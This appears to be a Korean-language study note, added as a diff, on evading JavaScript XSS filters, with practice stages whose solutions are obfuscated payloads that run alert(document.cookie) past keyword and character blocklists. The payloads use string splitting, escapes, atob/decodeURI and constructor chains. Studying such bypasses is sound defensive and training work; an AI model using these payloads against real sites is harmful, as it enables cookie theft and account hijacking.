@@ -1,0 +1,255 @@
+JavaScript Function & Keyword Filtering :
+    JavaScript는 Unicode escape sequence ("\uAC00" = "가") 와 
+    같이 문자열에서 유니코드 문자를 코드포인트로 나타낼 수 있는 표기), 
+    computed member access (객체의 특정 속성을 접근할 때 속성 이름을 동적으로 계산함) 등 
+    코드를 난독화할 수 있는 다양한 기능들을 포함하여 다음과 같이 필터를 우회할 수 있습니다.
+
+    atob 와 decodeURI 함수는 각각 Base64 및 URI로 인코딩된 데이터를 디코딩하는 함수로써 키워드 등을 부호화하여 필터를 우회할 수 있습니다.
+
+    ex)
+        x => typeof x === 'string' && !x.includes('alert') && !x.includes('window') && !x.includes('document')
+        
+        --> this['al'+'ert']((({'\u0063ookie':x})=>x)(self['\x64ocument']))
+            --> this.alert((({cookie: x}) => x)(self.document)
+            --> window.alert(self.document.cookie)
+            --> alert(document.cookie)
+
+    ex)
+        x => typeof x === 'string' && !x.includes('eval') && !x.includes('cookie')
+        
+        --> isNaN['construct'+'or'](atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))()
+            --> isNaN['constr'+'uctor']("alert(document.cookie)")()
+            --> Function("alert(document.cookie)")()
+            --> alert(document.cookie)
+        
+        --> self['constru'+'ctor']['con'+'structor'](decodeURI("%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65"))
+            --> self['constru'+'ctor']['con'+'structor']("alert(document.cookie)")()
+            --> self.constructor.constructor("alert(document.cookie)")()
+            --> Window.constructor("alert(document.cookie)")()
+            --> Function("alert(document.cookie)")()
+            --> alert(document.cookie)
+
+    다음은 XSS 공격에 흔히 사용되는 구문과 필터 우회를 위해 사용될 수 있는 대체 예시입니다.
+
+                구문                            대체 구문
+
+        alert, XMLHttpRequest 등             window['al'+'ert'], window['XMLHtt'+'pRequest'] 등
+        최상위 객체 및 함수                   이름 끊어서 쓰기
+
+        window                              self, 
+                                            this ("use strict" 가 비활성화되어 있고 this 가 명시된 메소드 호출이 아니라는 가정 하)
+
+        eval(code)                          Function(code)()
+
+        Function                            isNaN['constr'+'uctor'] 등
+                                            함수의 constructor 속성 접근
+
+    극단적인 사례로 JavaScript의 언어적 특성을 활용하면 6개의 문자([, ], (, ), !, +)만으로 모든 동작을 수행할 수 있습니다.
+    이 기법은 cookie와 같이 기존 XSS 필터들이 주로 탐지하는 단어들을 언급하지 않아도 된다는 장점이 있어 상당수의 웹 사이트들 공격하는 데에 활용되어 왔습니다.
+
+    필터링 또는 인코딩/디코딩 등의 이유로 특정 문자( (),[],",' 등)를 사용하지 못하는 경우가 있습니다.
+
+    JavaScript는 다양한 문법을 지원하는 언어로써 해당 문자를 대체할 수 있는 방법들을 통해 우회하여 공격할 수 있습니다.
+
+    1) 문자열 선언
+        - 일반적인 방법 : quotes(", ') 또는 Template literals 사용
+            ex)
+                var foo = "Hello";
+                var bar = "World";
+                
+                var baz = `${foo},
+                World ${1+1} `; // "Hello,\nWorld 2 "
+                /*
+                ***Template literals은 backtick을 통해 선언하며 멀티라인 문자열도 선언할 수 있습니다.
+                또한 내장된 표현식을 통해 다른 변수 또는 식을 사용할 수 있습니다.
+                */
+        - quotes 또는 Template literals을 사용하지 못하는 경우
+            ex)
+                var foo = /Hello World!/.source; // "Hello World!"
+                var foo2 = /test !/ + []; // "/test !/"
+                /*
+                RegExp Object의 pattern 부분을 이용.
+                /test/.constructor === RegExp
+                */
+
+                var bar = String.fromCharCode(72, 101, 108, 108, 111); // Hello
+                /*
+                String.fromCharCode함수는 유니코드의 범위 중 해당 수에 해당 하는 문자를 반환.
+                */
+                
+                var baz = history.toString()[8] + // "H"
+                (history+[])[9] + // "i"
+                (URL+0)[12] + // "("
+                (URL+0)[13]; // ")" ==> "Hi()"
+                /*
+                기본 내장 함수 또는 오브젝트의 문자를 사용하는 방법.
+                history.toString(); ==> "[object History]" 
+                URL.toString(); ==> "function URL() { [native code] }"
+                history+[]; history+0; // 연산을 위해 history 오브젝트에서 toString() 함수가 실행된다.
+                */
+                
+                    https://dreamhack.io/forum/qna/660
+                    URL()은 자바스크립트 내장함수입니다. URL+0을 하면 자바스크립트는 함수 URL을 문자열화시키고 
+                    (자바스크립트의 모든 객체는 문자열화가 가능하며 문자열화를 위한 toString()이라는 프로토타입 메소드를 가집니다.) 
+                    0도 문자열화 시켜서 둘을 더합니다.
+                        ex)
+                            URL+[] : "function URL() { [native code] }"
+                            URL+0 : "function URL() { [native code] }0"
+                            [URL+0] : ["function URL() { [native code] }0"]
+                            [URL+0][0] : "function URL() { [native code] }0"
+                            [URL+0][0][12] : "("
+
+                    그래서 결과물이 문자열 "function URL() { [native code] }0"가 됩니다.
+                    제 생각에는 자바스크립트는 두 객체를 더할 때 함수와 숫자를 더하는 것과 같이 이상한 덧셈에서는 둘을 문자열화 시켜서 더하는 특징이 있습니다. 
+                    아래 사진은 제 생각의 증거입니다.
+                        ex)
+                            function f() {
+                                return 1234567;
+                            }
+                            f + true : "function f() {
+                                            return 1234567;
+                                        }true"
+                            f.toString() + f.toString() : "function f() {
+                                                                return 1234567;
+                                                            }true"
+
+                    [URL+0]은 문자열 "function URL() { [native code] }0"이 Array에 담겨서 ["function URL() { [native code] }0"]이 됩니다.
+                    이 Array의 첫 번째 요소에 접근하면 [URL+0][0]이고 이것은 문자열 "function URL() { [native code] }0"입니다. 
+                    이제 이 문자열의 13번째 문자는 [URL+0][0][12]이며 "("이 됩니다.
+
+                var qux = 29234652..toString(36); // "hello"
+                var qux2 = 29234652 .toString(36); // "hello"
+                // parseInt("hello", 36); ==> 29234652
+                /*
+                E4X operator("..") 연산자를 이용하여 number 오브젝트에 접근.
+                또한, 숫자 속성에 접근 시, 앞에 공백을 한 칸 추가해 점이 소수점으로 인식되지 않도록 하는 방법도 있습니다.
+                */
+
+                정규식 : https://developer.mozilla.org/ko/docs/Web/JavaScript/Guide/%EC%A0%95%EA%B7%9C%EC%8B%9D
+                    var re = /ab+c/;
+                    var re = new RegExp("ab+c"); 같이 만듬
+
+    2) 함수 호출
+        - 일반적인 방법 : 괄호(Parentheses, ()) 또는 Tagged templates 사용
+            ex)    
+                alert(1);
+                alert`1`;
+
+        - 괄호 또는 Tagged templates를 사용하지 못하는 경우
+            ex)
+                location="javascript:alert\x281\x29;";
+                location.href="javascript:alert\u00281\u0029;";
+                location['href']="javascript:alert\0501\051;";
+                /*
+                javascript scheme 을 통해 함수 실행.
+                
+                href attribute를 가진 태그를 사용하면 아마 다 된다.
+                */
+                
+                "alert\x281\x29"instanceof{[Symbol.hasInstance]:eval};
+                Array.prototype[Symbol.hasInstance]=eval;"alert\x281\x29"instanceof[];
+                /*
+                JavaScript에서는 문자열 이외에도 ECMAScript 6에서 추가된 Symbol 또한 속성 명칭으로 사용할 수 있습니다.
+                Symbol.hasInstance well-known symbol을 이용하면 instanceof 연산자를 override할 수 있습니다.
+                즉, (O instanceof C)를 연산할 때 C에 Symbol.hasInstance 속성에 함수가 있을 경우 메소드로 호출하여 instanceof 연산자의 결과값으로 사용하게 됩니다.
+                이 특성을 이용해 instanceof를 연산하게 되면 실제 인스턴스 체크 대신 원하는 함수를 메소드로 호출되도록 할 수 있습니다.
+                */
+                
+                document.body.innerHTML+="<img src=x: onerror=alert&#40;1&#41;>";
+                /*
+                document에 새로운 html 추가를 통해 자바스크립트 실행. 
+                */
+
+        - 기타 
+            ex)
+                alert['toString'] === alert.toString;
+                // 속성 참조
+               
+                \u0061lert == \u{61}lert; // alert
+                // unicode를 이용하여 문자열 우회
+
+실습 :
+    주어진 필터링을 우회해서 alert(document.cookie)를 실행시키면 됩니다.
+
+    Stage 1 :
+        function XSSFilter(data){
+            if(/alert|window|document/.test(data)){
+                return false;
+            }
+            return true;
+        }
+
+    <script>
+        답(JavaScript) : 
+        this['al'+'ert'](this['docu'+'ment']['coo'+'kie']);
+        or
+        this['al'+'ert']((({'\u0063ookie':x})=>x)(self['\x64ocument']))
+        or
+        isNaN['construct'+'or'](atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))()
+    </script>
+
+    function XSSFilter(data){
+        if(/alert|window|document/.test(data)){
+            return false;
+        }
+        return true;
+    }
+    /* "alert", "window" 또는 "document" 문자열이 포함되어 있는지 확인하는 필터링입니다.
+    * 하지만 this[propertyKey] 문법을 이용해 쉽게 우회가 가능합니다.
+    */
+    this['al'+'ert'](this['docu'+'ment']['coo'+'kie']);
+
+    Stage 2 :
+        function XSSFilter(data){
+            if(/alert|window|document|eval|cookie|this|self|parent|top|opener|function|constructor|[\-+\\<>{}=]/i.test(data)){
+                return false;
+            }
+            return true;
+        }
+
+    <script>
+        답(JavaScript) : 
+        isNaN[atob('Y29uc3RydWN0b3I')](atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ'))();
+    </script>
+
+    function XSSFilter(data){
+        if(/alert|window|document|eval|cookie|this|self|parent|top|opener|function|[\-+\\<>{}=]/i.test(data)){
+            return false;
+        }
+        return true;
+    }
+    /* 주요 키워드 이외에도 특수문자 등을 탐지합니다.
+    * decodeURI, atob와 constructor 속성을 함께 사용하면 원하는 임의의 코드를 실행할 수 있습니다.
+    */
+    // %63%6F%6E%73%74%72%75%63%74%6F%72 -> constructor
+    // %61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29 -> alert(document.cookie)
+    
+    Boolean[decodeURI('%63%6F%6E%73%74%72%75%63%74%6F%72')](
+        decodeURI('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))();
+    
+    Boolean[atob('Y29uc3RydWN0b3I')](atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ'))();
+    // JavaScript 함수 내장 개체의 함수 속성과 기초 객체이용하면 된다.
+    //  eval(), uneval(), isFinite(), isNaN(), parseFloat(), parseInt(),
+    //  encodeURI(), encodeURIComponent(), decodeURI() ,decodeURIComponent()
+    //  escape(), unescape(), Object, Function, Boolean, Symbol, 거의 return 값이 true or false
+    // https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects
+
+    Stage 3 :
+        function XSSFilter(data){
+            if(/[()"'`]/.test(data)){
+                return false;
+            }
+            return true;
+        }
+
+        <script>
+            답(JavaScript) : 
+            location=/javascript:/.source + /alert/.source + [URL+0][0][12] + /document.cookie/.source +[URL+0][0][13]
+        </script>
+            // URL() 뿐만 아니라 기본적으로 내장 함수 아무거나 사용해도 된다.
+        
+
+
+
+
+
